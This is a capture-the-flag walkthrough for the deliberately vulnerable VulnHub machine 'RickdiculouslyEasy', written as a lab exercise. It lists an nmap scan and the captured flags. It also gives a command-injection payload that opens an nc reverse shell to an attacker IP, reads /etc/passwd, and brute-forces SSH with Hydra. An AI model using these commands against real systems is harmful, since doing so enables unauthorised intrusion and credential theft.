# [Machine](https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/)
# 130/130 POINTS

- # ENUM
	- ### nmap (`nmap -sV -A -p- -T5 Rick-1 `)
		- ```PORT      STATE SERVICE    VERSION
			21/tcp    open  ftp        vsftpd 3.0.3
			| ftp-syst: 
			|   STAT: 
			| FTP server status:
			|      Connected to ::ffff:192.168.1.144
			|      Logged in as ftp
			|      TYPE: ASCII
			|      No session bandwidth limit
			|      Session timeout in seconds is 300
			|      Control connection is plain text
			|      Data connections will be plain text
			|      At session startup, client count was 2
			|      vsFTPd 3.0.3 - secure, fast, stable
			|_End of status
			| ftp-anon: Anonymous FTP login allowed (FTP code 230)
			| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
			|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
			22/tcp    open  tcpwrapped
			|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
			80/tcp    open  http       Apache httpd 2.4.27 ((Fedora))
			| http-methods: 
			|_  Potentially risky methods: TRACE
			|_http-title: Morty's Website
			|_http-server-header: Apache/2.4.27 (Fedora)
			9090/tcp  open  http       Cockpit web service 161 or earlier
			|_http-title: Did not follow redirect to https://Rick-1:9090/
			13337/tcp open  tcpwrapped
			22222/tcp open  ssh        OpenSSH 7.5 (protocol 2.0)
			| ssh-hostkey: 
			|   2048 b4:11:56:7f:c0:36:96:7c:d0:99:dd:53:95:22:97:4f (RSA)
			|   256 20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e (ECDSA)
			|_  256 a6:84:fa:0f:df:e0:dc:e2:9a:2d:e7:13:3c:e7:50:a9 (ED25519)
			60000/tcp open  tcpwrapped
			Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
		- ### PORTS
			- 21 -> ftp
			- 22 -> unknown
			- 80 -> http
			- 9090 -> http
			- 13337 -> unknown
			- 22222 -> ssh
			- 60000 -> unknown
	- ### dirbuster & gobuster
		- #### Port 80
			- `/index.html`
			- `/passwords`
				- `/FLAG.txt`
				- `/passwords.html`
			- `/robots.txt`
			- `/cgi-bin`
				- `/tracertool.cgi`
				- `/root_shell.cgi`

- # FLAGS
	- `http://rick-1/passwords/FLAG.txt` -> `FLAG{Yeah d- just don't do it.}` - ***10 Points***
	- `http://rick-1:9090/`-> `FLAG{THERE IS NO ZEUS, IN YOUR FACE!}` - ***10 Points***
	- FTP -> `FLAG.txt` -> `FLAG{Whoa this is unexpected} `- ***10 Points***
	- Connect to unknown ports (13337) via `netcat` -> `FLAG{TheyFoundMyBackDoorMorty}`- ***10 Points***
	- Connect to unknown ports (60000) via `netcat` -> `FLAG.txt` -> `FLAG{Flip the pickle Morty!}` - ***10 Points***
	- Summer@Rick-1 -> `FLAG.txt`-> `FLAG{Get off the high road Summer!}` - ***10 Points***
	- `journal.txt` ->`FLAG: {131333}` - ***20 Points***
	- `./safe 131333` ->`FLAG{And Awwwaaaaayyyy we Go!}` - ***20 Points***
	- /root/FLAG.txt -> `FLAG: {Ionic Defibrillator}` - ***30 points***

- # EXPLOITATION
	- `http://rick-1/passwords/passwords.html` -> password: `winter`
	- In `http://rick-1/cgi-bin/tracertool.cgi` there's a traceroute machine!
		- `127.0.0.1; nc -e /bin/bash 192.168.1.144 4444`
			- `grep "[a-zA-Z0-9]" /etc/passwd`
				- ```...
					RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
					Morty:x:1001:1001::/home/Morty:/bin/bash
					Summer:x:1002:1002::/home/Summer:/bin/bash
					...```
	- Connect via SSH to Summer (passoword: `winter`)
		- ```scp -P 22222 Summer@Rick-1:/home/Morty/Safe_Password.jpg /home/eppo```
			- Password: `Meeseek`
		- ```scp -P 22222 Summer@Rick-1:/home/Morty/journal.txt.zip /home/eppo```
		- ```scp -P 22222 Summer@Rick-1:/home/RickSanchez/RICKS_SAFE /home/eppo```
			- ```decrypt: 	Ricks password hints:
				(This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
				Follow these clues, in order
				
				1 uppercase character
				1 digit
				One of the words in my old bands name.```
	- Let's make a script:
		```python
		alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		digits = "0123456789"
		band = ["Flesh", "Curtains"]
		
		with open("/home/eppo/MyStuff/CyberSecurity/Scripts/RickPass/RickPasses.txt", 'w') as f:
		for alph in alphabet:
			for digit in digits:
				for bandWord in band:
					f.write(f"{alph}{digit}{bandWord}\n")
		```
	- Use Hydra to bruteforce the password:
		- `hydra -l RickSanchez -P RickPasses.txt Rick-1 ssh -s 22222 -V`
			- Password: `P7Curtains`
	- Log into SSH again with user `RickSanchez` and password `P7Curtains`
		- `sudo /bin/bash`
			- We're ROOT!
